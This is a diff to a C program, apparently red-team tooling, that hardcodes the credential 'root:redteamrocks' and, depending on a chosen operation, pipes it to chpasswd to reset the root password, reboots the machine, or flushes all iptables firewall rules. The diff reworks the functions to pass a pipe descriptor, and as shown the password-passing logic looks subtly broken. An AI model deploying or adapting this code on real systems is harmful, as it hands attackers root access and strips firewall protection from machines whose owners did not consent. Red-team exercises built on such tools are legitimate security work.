@@ -31,14 +31,12 @@
 #define PASSWORD "root:redteamrocks\n"
 #define DEBUG 0  // Set to 1 to enable debug output
 
-
-void reset_password(void);
-void reboot_system(void);
-void flush_iptables(void);
-
+void reset_password(int);
+void reboot_system(int);
+void flush_iptables(int);
 
 // Any function that takes no arguments and returns void
-typedef void (*operation_t)(void);
+typedef void (*operation_t)(int);
 
 size_t num_operations = 2;
 operation_t operations[] = {
@@ -47,15 +45,19 @@ operation_t operations[] = {
     flush_iptables
 };
 
-void reset_password(void) {
+void reset_password(int stdin_fd) {
     char *args[] = { "chpasswd", NULL };
+    char *str = PASSWORD;
+    int len = strlen(str);
+    write(stdin_fd, str, len);
+
 #if !(DEBUG)
     printf("password reset\n");
 #endif // !DEBUG
     execvp(args[0], args);
 }
 
-void reboot_system(void) {
+void reboot_system(int stdin_fd) {
     char *args[] = { "reboot", NULL };
 #if !(DEBUG)
     printf("reboot\n");
@@ -63,7 +65,7 @@ void reboot_system(void) {
     execvp(args[0], args);
 }
 
-void flush_iptables(void) {
+void flush_iptables(int stdin_fd) {
     char *args[] = { "iptables", "-F", NULL };
 #if !(DEBUG)
     printf("iptables flush\n");
@@ -95,9 +97,6 @@ int main(int argc, char **argv) {
     // utility
     int pipefd[2];
     pipe(pipefd);
-    char *str = PASSWORD;
-    int len = strlen(str);
-    write(pipefd[1], str, len);
 
     // The child will be responsible for changing the password of the root
     // user. The parent will be responsible for calling the program that the
@@ -118,7 +117,7 @@ int main(int argc, char **argv) {
 #endif // !DEBUG
 
         operation_t command = choose_operation();
-        command();
+        command(pipefd[1]);
 
         // Only reachable if execing passwd failed
         exit(EXIT_FAILURE);
